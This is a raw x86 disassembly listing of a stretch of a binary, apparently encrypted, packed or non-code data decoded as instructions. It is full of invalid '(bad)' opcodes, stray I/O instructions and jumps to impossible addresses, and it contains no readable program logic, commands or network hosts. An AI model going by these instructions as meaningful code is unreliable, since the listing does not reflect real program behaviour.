  408eed:	or     eax,0xb58f75fe
  408ef2:	adc    bh,bh
  408ef4:	jo     0x408e94
  408ef6:	call   0x408ff4
	...
  408f1f:	add    BYTE PTR [eax],al
  408f21:	add    ch,bl
  408f23:	sahf   
  408f24:	(bad)  
  408f25:	jmp    0x408f2b
  408f27:	rol    BYTE PTR [ecx+0x2c],cl
  408f2a:	out    dx,al
  408f2b:	fdiv   DWORD PTR [ebx+0x689eb0fe]
  408f31:	add    eax,DWORD PTR [ebp+0x1e]
  408f34:	(bad)  
  408f35:	(bad)  
  408f36:	cli    
  408f37:	jmp    0xb5f18f39
  408f3c:	push   edx
  408f3d:	mov    bh,0x3e
  408f3f:	xor    al,0x3
  408f41:	or     edi,DWORD PTR [esi+0x47]
  408f44:	(bad)  
  408f45:	addr16 out dx,eax
  408f47:	push   0xffffffc3
  408f49:	push   DWORD PTR [eax]
  408f4b:	sub    BYTE PTR [edi],cl
  408f4d:	call   0xffbc87ec
  408f52:	and    DWORD PTR [eax-0x49],ebp
  408f55:	(bad)  
  408f56:	sbb    DWORD PTR [edx+0x70cae7d3],edi
  408f5c:	jl     0x408f5d
  408f5e:	outs   dx,BYTE PTR ds:[esi]
  408f5f:	loop   0x408fe0
  408f61:	jge    0x408f91
  408f63:	xor    dh,bh
  408f65:	or     al,0x66
  408f67:	xchg   esp,eax
  408f68:	rol    BYTE PTR [eax+0x3e],cl
  408f6b:	ret    0x226a
  408f6e:	mov    cl,0x32
  408f70:	add    ebp,ebx
  408f72:	cmp    ebp,DWORD PTR [edx+0x323e0002]
  408f78:	(bad)  [edx]
  408f7a:	inc    dh
  408f7c:	or     DWORD PTR [edx-0x37],edx
  408f7f:	mov    edi,0x50a8e80a
  408f84:	jl     0x408f85
	...
  408fae:	add    BYTE PTR [eax],al
  408fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fb1:	jle    0x408ffc
  408fb3:	push   DWORD PTR [ecx-0x573d7951]
  408fb9:	sub    DWORD PTR [ebx+0x50],edi
  408fbc:	mov    eax,ds:0x99febf67
  408fc1:	cmp    DWORD PTR [eax+eax*1-0x38],ebp
  408fc5:	xor    al,BYTE PTR [ebx]
  408fc7:	test   DWORD PTR [esi+0x39],edi
  408fca:	adc    BYTE PTR [eax],0x81
  408fcd:	adc    DWORD PTR [ebx-0x1],edi
  408fd0:	mov    bl,0xd6
  408fd2:	jns    0x408fd3
  408fd4:	jno    0x408fe0
  408fd6:	ja     0x408f8d
  408fd8:	xor    bh,BYTE PTR ds:[edx-0x4b]
  408fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fdd:	lock jp 0x408fdf
  408fe0:	pop    bx
  408fe2:	or     eax,0xb020514e
  408fe7:	inc    esi
  408fe8:	cmp    bl,BYTE PTR [ebx+0x3c]
  408feb:	(bad)  
  408fec:	push   edx
  408fed:	fsub   QWORD PTR [eax+edi*2+0x4859601]
  408ff4:	ds pop ebx
  408ff6:	jmp    0x81904375
  408ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ffc:	lock pop ds
  408ffe:	outs   dx,BYTE PTR ds:[esi]
  408fff:	paddd  mm4,QWORD PTR [esi+0x1f7b8d03]
  409006:	pop    esi
  409007:	icebp  
  409008:	cmp    DWORD PTR [eax],esp
  40900a:	fdiv   QWORD PTR [edi+0x16]
  40900d:	add    ebx,DWORD PTR [ebx+edi*2]
  409010:	stc    
  409011:	mov    al,BYTE PTR [esi-0xf]
	...
  40903c:	add    BYTE PTR [eax],al
  40903e:	cmc    
  40903f:	xor    bh,cl
  409041:	dec    ebp
  409042:	jmp    0xe601f666
  409047:	mov    ah,0xe8
  409049:	jp     0x40909e
  40904b:	pop    ds
  40904c:	es icebp 
  40904e:	cmp    DWORD PTR [ebx],esi
  409050:	aad    0x79
  409052:	leave  
  409053:	pop    ds
  409054:	push   ss
  409055:	icebp  
  409056:	lds    esi,FWORD PTR [edx]
  409058:	icebp  
  409059:	dec    ebp
  40905a:	mov    ecx,0x4246301f
  40905f:	pop    ebx
  409060:	xchg   esp,eax
  409061:	mov    ds,WORD PTR [edx-0x5f8bd327]
  409067:	pop    ds
  409068:	out    dx,al
  409069:	in     eax,dx
  40906a:	cdq    
  40906b:	mov    cl,0xea
  40906d:	jp     0x40907a
  40906f:	push   ebx
  409070:	shl    DWORD PTR [edx],1
  409072:	sbb    DWORD PTR [edi],0x1efb8cd6
  409078:	inc    ecx
  409079:	add    BYTE PTR [edi],bh
  40907b:	pop    ebx
  40907c:	jmp    0xbf684c09
  409081:	jp     0x4090ec
  409083:	mov    al,BYTE PTR [eax]
  409085:	shl    DWORD PTR [esi+0x48e8ffe5],0x1b
  40908c:	(bad)  
  40908e:	cwde   
  40908f:	pop    edx
  409090:	add    cl,ch
  409092:	push   es
  409093:	push   edi
  409094:	add    ecx,ebp
  409096:	cmp    eax,0x3d718750
  40909b:	pop    ebx
  40909c:	add    BYTE PTR [ecx],dl
  40909e:	mov    al,0x8c
  4090a0:	inc    ecx
  4090a1:	jmp    0x4090a6
	...
  4090ca:	add    BYTE PTR [eax],al
  4090cc:	mov    dh,0xd8
  4090ce:	div    BYTE PTR [edi-0x5c]
  4090d1:	push   ds
  4090d2:	push   eax
  4090d3:	sbb    DWORD PTR [edi],0xc266ff10
  4090d9:	fsubr  st,st(7)
  4090db:	pop    edi
  4090dc:	test   BYTE PTR [esi],bl
  4090de:	call   FWORD PTR [ebp+ecx*4-0x1ab100e3]
  4090e5:	pop    edx
  4090e6:	add    ecx,ebp
  4090e8:	cmp    eax,0x673684d0
  4090ed:	push   ds
  4090ee:	call   FWORD PTR [ecx-0x57b8162b]
  4090f4:	cmp    eax,0xfabb0fb3
  4090f9:	push   ds
  4090fa:	addr16 icebp 
  4090fc:	repz fwait
  4090fe:	add    BYTE PTR [ecx],al
  409100:	clc    
  409101:	out    0xff,eax
  409103:	call   0xd8b4ac50
  409108:	mov    ds:0x2c648c1e,eax
  40910d:	sbb    eax,0x1d8cf6ff
  409112:	jne    0x4090f5
  409114:	and    eax,0x17e6fcc1
  409119:	push   ds
  40911a:	mov    ch,0xd9
  40911c:	add    al,0x1e
  40911e:	inc    DWORD PTR [ecx+0x3e]
  409121:	pop    esp
  409122:	add    cl,ch
  409124:	rcr    al,0xf6
  409127:	add    BYTE PTR [ecx-0x5c],bh
  40912a:	call   DWORD PTR [eax+0xf]
  40912d:	call   0x40d279
	...
  40915a:	push   edi
  40915b:	xor    dl,BYTE PTR [edx]
  40915d:	push   edx
  40915e:	es push edi
  409160:	push   0xff1a1508
  409165:	out    0x4f,eax
  409167:	in     eax,dx
  409168:	(bad)  
  409169:	call   FWORD PTR [edx+ebx*4+0x74]
  40916d:	adc    DWORD PTR ds:0xb0858d57,edi
  409173:	mov    eax,ds:0xa447ffff
  409178:	jne    0x409182
  40917a:	mov    edi,0xa8fffc03
  40917f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409180:	mov    ch,0xf0
  409182:	cdq    
  409183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409184:	(bad)  
  409185:	call   0x402261
  40918a:	std    
  40918b:	outs   dx,BYTE PTR ds:[esi]
  40918c:	call   0xffe4ec22
  409191:	or     esp,DWORD PTR [edi]
  409193:	sub    ebx,DWORD PTR [ebx]
  409195:	push   0x400a8e
  40919a:	(bad)  
  40919b:	mov    cl,0x1d
  40919d:	int    0x28
  40919f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091a0:	push   eax
  4091a1:	push   0xffffffe7
  4091a3:	or     esi,edi
  4091a5:	jne    0x409176
  4091a7:	mov    cl,0x32
  4091a9:	std    
  4091aa:	sub    BYTE PTR [eax+ebp*8-0x5ba1e7],ah
  4091b1:	push   0x400a5f
  4091b6:	int    0x3f
  4091b8:	push   DWORD PTR [ebp-0x61]
  4091bb:	mov    cl,0xaa
  4091bd:	inc    BYTE PTR [eax]
	...
  4091e7:	add    BYTE PTR [eax+0x56d868a2],ch
  4091ed:	sbb    bh,bh
  4091ef:	imul   esi,DWORD PTR [esp+eiz*4],0x1c3e0875
  4091f6:	pushf  
  4091f7:	(bad)  
  4091f8:	jns    0x409206
  4091fa:	jmp    0x4091d3
  4091fc:	(bad)  
  4091fe:	add    al,0x6a
  409200:	dec    edx
  409201:	fucomp st(5)
  409203:	pop    es
  409204:	push   esi
  409205:	mov    bh,0x79
  409207:	call   FWORD PTR [ecx-0x14]
  40920a:	in     eax,dx
  40920b:	sti    
  40920c:	push   ecx
  40920d:	ds or  al,0xe8
  409210:	jmp    0x78400a0a
  409215:	icebp  
  409216:	(bad)  
  409217:	call   DWORD PTR [edx+0x3e6867b9]
  40921d:	xor    ch,BYTE PTR [eax-0x42]
  409220:	sub    DWORD PTR [eax],ebp
  409222:	pop    es
  409223:	jmp    FWORD PTR [ebx+0x28d76b3a]
  409229:	scas   al,BYTE PTR es:[edi]
  40922a:	js     0x4091f5
  40922c:	cld    
  40922d:	sub    al,BYTE PTR [ebx]
  40922f:	push   ebp
  409230:	mov    ch,0x8e
  409232:	test   ah,al
  409234:	push   es
  409235:	outs   dx,BYTE PTR ds:[esi]
  409236:	mov    esi,0x3323efb
  40923b:	add    bl,al
  40923d:	out    dx,eax
  40923e:	jbe    0x409290
  409240:	push   esi
  409241:	push   eax
  409242:	(bad)  
  409243:	inc    eax
  409244:	ds gs out dx,al
  409247:	or     ebx,ecx
  409249:	daa    
  40924a:	dec    esi
  40924b:	dec    eax
	...
  409274:	add    BYTE PTR [eax],al
  409276:	jg     0x4092aa
  409278:	imul   edi,DWORD PTR [edx+0xb783df5],0xfffffffe
  40927f:	mov    esi,0x4a038918
  409284:	jmp    0x409286
  409286:	ds inc ebp
  409288:	mov    ecx,0x771e33ff
  40928d:	jne    0x409235
  40928f:	and    eax,0xf2a607ed
  409294:	push   0xe65b91ff
  409299:	icebp  
  40929a:	xchg   ecx,eax
  40929b:	xor    ebp,DWORD PTR [ecx+0x4c]
  40929e:	sbb    DWORD PTR [eax+eiz*4],0x345b4642
  4092a5:	mov    esp,DWORD PTR [edx-0x26]
  4092a8:	lods   al,BYTE PTR ds:[esi]
  4092a9:	mov    al,0x68
  4092ab:	sbb    al,0xbe
  4092ad:	aas    
  4092ae:	mov    ebx,0x5977b6e3
  4092b3:	pop    ebx
  4092b4:	jmp    0x2c10d0bc
  4092b9:	or     BYTE PTR ds:0xbe01151b,dh
  4092bf:	arpl   cx,bp
  4092c1:	lock inc edx
  4092c3:	xor    ah,ch
  4092c5:	add    al,0x3e
  4092c7:	pop    ebx
  4092c8:	xchg   cl,dh
  4092ca:	cmp    DWORD PTR [esp+esi*8],ebx
  4092cd:	pop    es
  4092ce:	push   ss
  4092cf:	das    
  4092d0:	mov    ds:0x198b1977,al
  4092d5:	ja     0x409262
  4092d7:	push   ebx
  4092d8:	push   ecx
  4092d9:	fiadd  WORD PTR [eax]
	...
  409303:	add    BYTE PTR [eax],cl
  409305:	sbb    al,0x5e
  409307:	ins    BYTE PTR es:[edi],dx
  409308:	inc    eax
  409309:	adc    edx,DWORD PTR [esi+0x77]
  40930c:	data16 es sahf 
  40930f:	(bad)  
  409310:	icebp  
  409311:	sbb    al,0xbc
  409313:	pop    es
  409314:	(bad)  
  409315:	or     dh,BYTE PTR [edx]
  409317:	ja     0x4092fa
  409319:	shr    DWORD PTR [ebx-0x44],1
  40931c:	fcomp  DWORD PTR [ebx]
  40931e:	cs in  al,dx
  409320:	adc    ebx,DWORD PTR [edx-0x17]
  409323:	add    edi,DWORD PTR [ebx-0x3e89d52b]
  409329:	sbb    edi,DWORD PTR [ecx+0xe13066b]
  40932f:	ja     0x4092f4
  409331:	aad    0x2a
  409333:	jbe    0x4092de
  409335:	sbb    ebx,DWORD PTR [ecx-0x1d148a]
  40933b:	not    BYTE PTR [eax]
  40933d:	sbb    al,0xe8
  40933f:	jae    0x40930d
  409341:	pop    edx
  409342:	add    BYTE PTR [eax-0x42],dh
  409345:	fdivp  st(5),st
  409347:	fimul  WORD PTR [eax]
  409349:	fwait
  40934a:	(bad)  
  40934c:	fcomp  DWORD PTR [edx+0x0]
  40934f:	jmp    0xc802591a
  409354:	lock sbb esi,edi
  409357:	jmp    0x4093a6
  409359:	pop    ebx
  40935a:	add    cl,ch
  40935c:	imul   esp,DWORD PTR [edi+0x1cff548d],0x98b6a6ff
  409366:	sub    al,0x39
	...
  409390:	add    BYTE PTR [eax],al
  409392:	push   edx
  409393:	sub    ecx,DWORD PTR [edi+0x28]
  409396:	inc    edx
  409397:	add    edx,DWORD PTR [ecx+0x5a]
  40939a:	cmp    eax,0x2ea90b5b
  40939f:	pop    ebp
  4093a0:	jmp    0x4093c5
  4093a2:	mov    bh,0xf0
  4093a4:	shl    DWORD PTR [edi-0x70],0x1a
  4093a8:	lea    ebp,[ebx]
  4093aa:	stos   WORD PTR es:[edi],ax
  4093ac:	push   0x9c005b
  4093b1:	push   ecx
  4093b2:	push   eax
  4093b3:	into   
  4093b4:	(bad)  
  4093b5:	call   0xebb5aefe
  4093ba:	fs fwait
  4093bc:	lea    ebx,[edi+edi*2+0x19]
  4093c0:	(bad)  
  4093c1:	ds mov dh,0x9d
  4093c4:	sub    al,0x60
  4093c6:	mov    esi,0x482efdcf
  4093cb:	xor    DWORD PTR [ecx-0x1e4fd4f],0xffffff94
  4093d2:	cmp    DWORD PTR [ebx],eax
  4093d4:	cmp    al,0x22
  4093d6:	xor    BYTE PTR [edx],bl
  4093d8:	call   DWORD PTR [ecx+eiz*8+0x19]
  4093dc:	inc    DWORD PTR [eax]
  4093de:	inc    eax
  4093df:	cs out 0x84,eax
  4093e2:	ins    BYTE PTR es:[edi],dx
  4093e3:	xchg   ecx,eax
  4093e4:	(bad)  
  4093e5:	call   FWORD PTR [edx]
  4093e7:	outs   dx,BYTE PTR ds:[esi]
  4093e8:	push   eax
  4093e9:	call   0x4038fa
  4093ee:	inc    edi
  4093ef:	das    
  4093f0:	(bad)  
  4093f1:	jne    0x409382
  4093f3:	xchg   BYTE PTR [ecx+0xfe],ah
	...
  40941d:	add    BYTE PTR [eax],al
  40941f:	add    BYTE PTR [eax-0x67861770],dl
  409425:	nop
  409426:	dec    DWORD PTR [ebp-0x16326]
  40942c:	mov    al,ds:0xd3b5fe2f
  409431:	nop
  409432:	(bad)  
  409433:	(bad)  
  409434:	jg     0x4093f0
  409436:	mov    dl,0x0
  409438:	push   edi
  409439:	cdq    
  40943a:	ror    BYTE PTR [edi],0xda
  40943d:	cli    
  40943e:	std    
  40943f:	call   eax
  409441:	(bad)  
  409442:	mov    ch,0xbc
  409444:	ror    DWORD PTR [edi-0x33201701],0xff
  40944b:	jmp    DWORD PTR [eax-0x6f014836]
  409451:	nop
  409452:	call   0xffd06ca0
  409457:	leave  
  409458:	push   ebp
  409459:	arpl   WORD PTR [eax],ax
  40945b:	push   ebp
  40945c:	mov    WORD PTR [ebx-0x6f6c3b7d],es
  409462:	jne    0x409470
  409464:	jg     0x409446
  409466:	retf   0x80ff
  409469:	out    0x44,al
  40946b:	cld    
  40946c:	in     al,dx
  40946d:	popf   
  40946e:	je     0x40f3d7
  409474:	push   DWORD PTR ds:0x8ed74152
  40947a:	jne    0x409478
  40947c:	das    
  40947d:	ror    ecx,1
  40947f:	(bad)  
  409480:	ds jno 0x409457
  409483:	add    BYTE PTR [bx+si],al
	...
  4094ae:	out    0xd4,eax
  4094b0:	sar    edi,0xf9
  4094b3:	pusha  
  4094b4:	out    dx,eax
  4094b5:	pop    es
  4094b6:	xchg   esi,eax
  4094b7:	scas   eax,DWORD PTR es:[edi]
  4094b8:	jbe    0x4094b9
  4094ba:	cdq    
  4094bb:	pop    ebx
  4094bc:	or     edi,eax
  4094be:	xchg   ecx,eax
  4094bf:	or     bl,ch
  4094c1:	ins    BYTE PTR es:[edi],dx
  4094c2:	in     eax,dx
  4094c3:	inc    edx
  4094c4:	add    al,0xff
  4094c6:	or     edi,DWORD PTR [eax]
  4094c8:	imul   ebx,DWORD PTR [ebp+0x50743084],0xffffffe6
  4094cf:	fcmove st,st(7)
  4094d1:	inc    eax
  4094d2:	ds je  0x40954a
  4094d5:	jne    0x40950d
  4094d7:	sub    al,0xf0
  4094d9:	std    
  4094da:	pop    ecx
  4094db:	shr    BYTE PTR [edx-0x16],1
  4094de:	js     0x4094a8
  4094e0:	jae    0x40954a
  4094e2:	rcl    BYTE PTR [ebx+eax*8-0x1],0x40
  4094e7:	outs   dx,BYTE PTR ds:[esi]
  4094e8:	js     0x4094d2
  4094ea:	mov    edx,0x8eff73bc
  4094ef:	pop    edx
  4094f0:	stos   DWORD PTR es:[edi],eax
  4094f1:	push   ebx
  4094f2:	jg     0x4094f6
  4094f4:	sar    esi,cl
  4094f6:	stos   DWORD PTR es:[edi],eax
  4094f7:	or     ch,BYTE PTR [ebx+0x52]
  4094fa:	sbb    BYTE PTR [edx-0x3ef8178c],dl
  409500:	jae    0x409501
  409502:	xchg   esi,eax
  409503:	loop   0x4094d4
  409505:	inc    eax
  409506:	ds mov ecx,0xcde6fbee
  40950c:	dec    eax
  40950d:	push   ecx
  40950f:	shr    dl,cl
  409511:	test   al,0x0
	...
  40953b:	add    BYTE PTR [ebp-0x1eaffd3d],cl
  409541:	iret   
  409542:	or     ch,al
  409544:	(bad)  
  409546:	je     0x409547
  409548:	out    0xda,al
  40954a:	cmp    al,0xff
  40954c:	leave  
  40954d:	pop    ebx
  40954e:	es out dx,al
  409550:	lds    eax,FWORD PTR [ebx]
  409552:	dec    ecx
  409553:	cmp    eax,0x412018b9
  409558:	inc    esi
  409559:	pop    ebx
  40955a:	mov    ah,0x88
  40955c:	call   0xe985:0x9772cdc
  409563:	jmp    0xbbcada5
  409568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409569:	sbb    ch,BYTE PTR [edx]
  40956b:	je     0x4094f6
  40956d:	loop   0x40959a
  40956f:	jo     0x409526
  409571:	push   esi
  409572:	inc    eax
  409573:	mov    esp,0x33695afe
  409578:	ds (bad) 
  40957a:	adc    bl,ah
  40957c:	inc    edi
  40957d:	lods   eax,DWORD PTR ds:[esi]
  40957e:	sub    BYTE PTR [ecx+ecx*1],al
  409581:	add    eax,ebp
  409583:	mov    dh,0x3e
  409585:	pop    ebx
  409586:	loop   0x4095cb
  409588:	retf   0x1678
  40958b:	pop    esp
  40958c:	push   es
  40958d:	sub    esp,DWORD PTR [esi+0x151b3573]
  409593:	sbb    BYTE PTR [esi+0x7ed74083],cl
  409599:	pop    ebx
  40959a:	cmp    DWORD PTR [ebx-0x4d],esi
  40959d:	arpl   WORD PTR [ecx+0x5b],dx
	...
  4095c7:	add    BYTE PTR [eax],al
  4095c9:	add    BYTE PTR [ebx],ah
  4095cb:	sbb    BYTE PTR [esi+0x5c],bh
  4095ce:	mov    BYTE PTR [ecx],ah
  4095d0:	jbe    0x409645
  4095d2:	adc    cl,BYTE PTR [ecx+ebp*4-0x53]
  4095d6:	or     DWORD PTR [eax],ebx
  4095d8:	data16 jae 0x4095e7
  4095db:	leave  
  4095dc:	and    BYTE PTR [ebx],cl
  4095de:	jae    0x4095fe
  4095e0:	ret    
  4095e1:	or     eax,0x5be18df1
  4095e6:	out    dx,eax
  4095e7:	sbb    BYTE PTR [esi+0x73],al
  4095ea:	push   esp
  4095eb:	cmp    al,0x3e
  4095ed:	stc    
  4095ee:	inc    ecx
  4095ef:	add    eax,DWORD PTR [eax]
  4095f1:	dec    esi
  4095f2:	dec    esp
  4095f3:	sbb    bh,bh
  4095f5:	ret    
  4095f6:	cmp    DWORD PTR [eax],ebx
  4095f8:	jne    0x4095eb
  4095fa:	gs ss (bad) 
  4095fd:	push   ds
  4095fe:	sub    eax,0xb7162685
  409603:	pop    edi
  409604:	call   0xff58c243
  409609:	xchg   ecx,eax
  40960a:	inc    ecx
  40960b:	lods   eax,DWORD PTR ds:[esi]
  40960c:	inc    ecx
  40960d:	jmp    0x149241e
  409612:	xchg   DWORD PTR [esi],edx
  409614:	(bad)  
  409615:	out    dx,al
  409616:	gs mov cl,0x52
  409619:	sub    BYTE PTR [edx],bh
  40961b:	sbb    BYTE PTR [ebp-0xf],dh
  40961e:	adc    eax,0xecd6fd53
  409623:	adc    BYTE PTR [eax-0x1e87cc5],0x3c
  40962a:	(bad)  
  40962b:	jmp    FWORD PTR [edx]
  40962d:	mov    esp,0x0
	...
  409656:	add    BYTE PTR [eax],al
  409658:	int3   
  409659:	pop    ss
  40965a:	push   0x9a6b77
  40965f:	scas   al,BYTE PTR es:[edi]
  409660:	inc    esi
  409661:	pop    edi
  409662:	call   0xff58656e
  409667:	adc    DWORD PTR [esi-0x5316be57],esi
  40966d:	nop
  40966e:	or     BYTE PTR [ecx-0x7900e7ae],al
  409674:	add    eax,0x4228533d
  409679:	push   ss
  40967a:	jne    0x40965d
  40967c:	jne    0x4096dd
  40967e:	std    
  40967f:	outs   dx,BYTE PTR ds:[esi]
  409680:	mov    WORD PTR [esi],ss
  409682:	jne    0x4096e9
  409684:	mov    WORD PTR [eax+0x1a2e5108],ss
  40968a:	call   DWORD PTR [esi+0xc]
  40968d:	and    al,0xc2
  40968f:	in     eax,0x3d
  409691:	mov    al,0x8b
  409693:	add    BYTE PTR [ebx-0x18f38323],cl
  409699:	push   cs
  40969a:	adc    eax,0xff6a92ff
  40969f:	jne    0x40968c
  4096a1:	mov    DWORD PTR [ebp+0x8],esi
  4096a4:	das    
  4096a5:	retf   0xffea
  4096a8:	pop    eax
  4096a9:	mov    DWORD PTR [ebp+0xc],esi
  4096ac:	aas    
  4096ad:	in     eax,0xc4
  4096af:	(bad)  
  4096b0:	cmp    BYTE PTR [edi-0x3e],dl
  4096b3:	or     al,0x97
  4096b5:	xor    ecx,DWORD PTR [edx-0x361db14]
  4096bb:	push   0x0
	...
  4096e5:	add    BYTE PTR [edi-0x67eb8a77],ah
  4096eb:	push   cs
  4096ec:	ud0    esp,edx
  4096ef:	pop    edx
  4096f0:	call   0xffcd468e
  4096f5:	or     esp,DWORD PTR [edi+0x22895b13]
  4096fb:	mov    ebp,DWORD PTR [eax+0x1a]
  4096fe:	inc    ebx
  4096ff:	sbb    bh,bh
  409701:	(bad)  
  409702:	adc    cl,BYTE PTR [ebx-0x7361f318]
  409708:	jmp    FWORD PTR [eax+0x57]
  40970b:	pop    edx
  40970c:	out    dx,eax
  40970d:	mov    esi,0x8758c07
  409712:	iret   
  409713:	mov    ebp,0x36c8fffe
  409718:	and    al,0x54
  40971a:	push   esi
  40971b:	pop    edi
  40971c:	push   DWORD PTR [ebp-0x45]
  40971f:	mov    dh,0xf1
  409721:	enter  0x8c98,0x68
  409725:	add    DWORD PTR [edi],esp
  409727:	jnp    0x4096e7
  409729:	push   eax
  40972a:	cwde   
  40972b:	push   cs
  40972c:	pop    es
  40972d:	call   0x4023bf
  409732:	cmovp  edx,DWORD PTR [ecx+eax*2+0x3e]
  409737:	add    al,0x70
  409739:	jne    0x409725
  40973b:	fwait
  40973c:	pop    edx
  40973d:	enter  0x9ce1,0xdc
  409741:	add    DWORD PTR [esi],edi
  409743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409744:	mov    dl,0x50
  409746:	rcl    esi,1
  409748:	cli    
  409749:	out    0x0,eax
	...
  409773:	add    BYTE PTR [ecx+0x45],bl
  409776:	jno    0x409777
  409778:	shl    esi,0x6e
  40977b:	call   0xffb1d6df
  409780:	xchg   DWORD PTR [ecx+0x14],eax
  409783:	add    BYTE PTR [ebx],dl
  409785:	jns    0x4097e7
  409787:	push   0xffc1f863
  40978c:	cwde   
  40978d:	mov    ?,edi
  40978f:	out    0xe2,eax
  409791:	cmp    esi,DWORD PTR [ecx-0x1]
  409794:	mov    DWORD PTR [esi+0x34965013],ecx
  40979a:	cmp    edi,edi
  40979c:	jns    0x4097d2
  40979e:	not    BYTE PTR [ebx]
  4097a0:	push   cs
  4097a1:	sub    eax,0x655607f6
  4097a6:	jno    0x4097a7
  4097a8:	popa   
  4097a9:	stos   DWORD PTR es:[edi],eax
  4097aa:	mov    ebx,0x7003ff53
  4097af:	jne    0x4097f3
  4097b1:	sbb    al,0x7d
  4097b3:	enter  0xc449,0x6f
  4097b7:	jne    0x4097e7
  4097b9:	push   esp
  4097ba:	pop    esp
  4097bb:	aad    0x6
  4097bd:	imul   BYTE PTR [edi-0x1]
  4097c0:	stos   DWORD PTR es:[edi],eax
  4097c1:	push   ss
  4097c2:	sar    esi,cl
  4097c4:	mov    bl,0xfa
  4097c6:	pop    edx
  4097c7:	sbb    al,0x21
  4097c9:	fisubr WORD PTR [edi-0x37]
  4097cc:	cld    
  4097cd:	xor    al,BYTE PTR [ebx]
  4097cf:	push   ebp
  4097d0:	(bad)
  4097d3:	les    ecx,FWORD PTR [edx]
  4097d5:	xchg   dh,dh
  4097d7:	or     eax,DWORD PTR [eax]
	...
  409801:	add    BYTE PTR [esi],dl
  409803:	pop    esp
  409804:	add    eax,0xf214f93b
  409809:	inc    ebx
  40980a:	push   0xffffffa1
  40980c:	pusha  
  40980d:	(bad)  
  40980e:	in     eax,0x83
  409810:	jmp    0xd1166918
  409815:	or     eax,0x70e99a72
  40981a:	dec    ebx
  40981b:	pop    ss
  40981c:	test   BYTE PTR ss:[ecx+0x3],0x62
  409821:	jo     0x4097e4
  409823:	adc    al,0x91
  409825:	add    bh,BYTE PTR [esi]
  409827:	add    al,0x5f
  409829:	fistp  DWORD PTR [edx-0x51]
  40982c:	test   al,0x3
  40982e:	test   eax,0x2b700d8e
  409833:	arpl   WORD PTR [ecx],dx
  409835:	stc    
  409836:	cwde   
  409837:	adc    al,0xfe
  409839:	fidivr DWORD PTR [edi]
  40983b:	pop    ebx
  40983c:	push   es
  40983d:	mov    cl,0x16
  40983f:	dec    ebx
  409840:	xchg   ebp,eax
  409841:	ret    0x1581
  409844:	pop    esp
  409845:	jo     0x4098c0
  409847:	mov    ?,ecx
  409849:	pop    ebx
  40984a:	fist   WORD PTR [ebx]
  40984c:	(bad)  
  40984d:	outs   dx,DWORD PTR ds:[esi]
  40984e:	imul   ecx,DWORD PTR [esi+0x1ee85ccd],0x19876fc6
  409858:	icebp  
  409859:	add    ebp,ebx
  40985b:	ffreep st(4)
  40985d:	add    DWORD PTR [edx-0x2bfbbce9],0x5d
  409864:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409865:	stc    
	...
  40988e:	add    BYTE PTR [eax],al
  409890:	inc    ecx
  409891:	add    eax,DWORD PTR [ecx+0x60143145]
  409897:	leave  
  409898:	and    eax,0x7ed38283
  40989d:	pop    ebx
  40989e:	adc    DWORD PTR [ebp+0x6ee99a6d],esi
  4098a4:	dec    ebx
  4098a5:	add    BYTE PTR cs:[ecx],ah
  4098a8:	add    edx,DWORD PTR [esi+edi*8]
  4098ab:	hlt    
  4098ac:	add    eax,0x6967adfc
  4098b1:	adc    al,0x68
  4098b3:	pop    esp
  4098b4:	or     eax,0x76c1009b
  4098b9:	test   al,0x41
  4098bb:	jmp    0xb215e710
  4098c0:	add    dl,BYTE PTR [esi+edi*8]
  4098c3:	mov    ah,0xd5
  4098c5:	sti    
  4098c6:	xchg   ebp,eax
  4098c7:	aaa    
  4098c8:	pop    ecx
  4098c9:	adc    al,0x68
  4098cb:	jmp    0x4098b6
  4098cd:	call   0xe941:0xa7f29100
  4098d4:	and    BYTE PTR [esi-0x2b],cl
  4098d7:	mov    eax,ds:0x94fe1382
  4098dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098dd:	sti    
  4098de:	jge    0x4098e7
  4098e0:	sub    DWORD PTR [eax+ebp*2],edx
  4098e3:	out    dx,al
  4098e4:	imul   ebx,DWORD PTR [edx-0x582d7f00],0x4e10e941
  4098ee:	aad    0x31
  4098f0:	adc    DWORD PTR [ebx],0xfffffffe
  4098f3:	push   esp
	...
  40991c:	add    BYTE PTR [eax],al
  40991e:	jb     0x40991b
  409920:	xlat   BYTE PTR gs:[ebx]
  409922:	fcom   DWORD PTR [ebx]
  409924:	push   0x9a8cc2
  409929:	push   ecx
  40992a:	icebp  
  40992b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40992c:	inc    ecx
  40992d:	jmp    0x2215e712
  409932:	adc    DWORD PTR [ebx],0xfffffffe
  409935:	xor    al,0x42
  409937:	sti    
  409938:	dec    ebp
  409939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40993a:	test   al,0x12
  40993c:	push   0x9c0c9c
  409941:	add    DWORD PTR [ecx-0x6f16be52],edx
  409947:	dec    eax
  409948:	aad    0x0
  40994a:	dec    edi
  40994b:	sbb    bh,bh
  40994d:	dec    BYTE PTR [edx]
  40994f:	pop    ss
  409950:	out    0x36,eax
  409952:	xchg   ecx,eax
  409953:	cmp    edi,0x402b1568
  409959:	add    BYTE PTR [edi],cl
  40995b:	stos   BYTE PTR es:[edi],al
  40995c:	push   ebx
  40995d:	inc    ecx
  40995e:	out    0x81,eax
  409960:	xor    eax,0xff179fd5
  409965:	dec    BYTE PTR [edx]
  409967:	pop    ss
  409968:	out    0x1e,eax
  40996a:	add    DWORD PTR [ecx+0x2ae068ff],0xa9ff0040
  409974:	push   ebx
  409975:	inc    ecx
  409976:	xlat   BYTE PTR ds:[ebx]
  409977:	xor    DWORD PTR ds:0xff17efd5,0xe716cafe
  409981:	push   es
	...
  4099aa:	add    BYTE PTR [eax],al
  4099ac:	push   ecx
  4099ad:	cmp    edi,0x402d3c68
  4099b3:	add    BYTE PTR [edi-0x58bead39],ch
  4099b9:	add    DWORD PTR ss:[eax],eax
  4099bc:	xchg   edi,eax
  4099bd:	fdivp  st(6),st
  4099bf:	jne    0x409960
